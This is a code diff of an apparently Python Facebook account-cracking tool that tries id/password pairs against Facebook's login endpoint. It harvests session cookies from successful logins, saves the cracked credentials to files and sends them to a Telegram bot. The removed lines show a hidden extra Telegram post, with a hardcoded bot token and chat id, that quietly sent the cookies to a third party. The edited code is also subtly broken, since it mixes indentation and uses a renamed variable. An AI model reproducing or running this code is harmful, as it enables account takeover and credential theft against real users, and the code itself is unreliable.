@@ -1862,38 +1862,43 @@ def m7(ids,pwv):
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
-            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
-            if 'access_token' in q:
+            response = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True)
+            if response.status_code == 200:
+              json_response = response.json()
+              if 'access_token' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
-                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={cid}"
                 res = requests.get(ckk).text
-                if 'Photoshop' in res:
+                if 'live' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                        stasok = (f" {kuki} ")
-                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                         oks.append(cid)
-                        break
-            elif 'access_token' in q:
+                        return True
+                if 'die' in res:
+			print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
+			return True
+              elif 'access_token' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
-                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={cid}"
                 res = requests.get(ckk).text
-                if 'Photoshop' in res:
+                if 'live' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
-                        stasok = (f" {kuki} ")
-                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                         oks.append(cid)
+                        return True
+                if 'die' in res:
+			print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
+			return True
             else:
                 continue
             time.sleep(0.01)
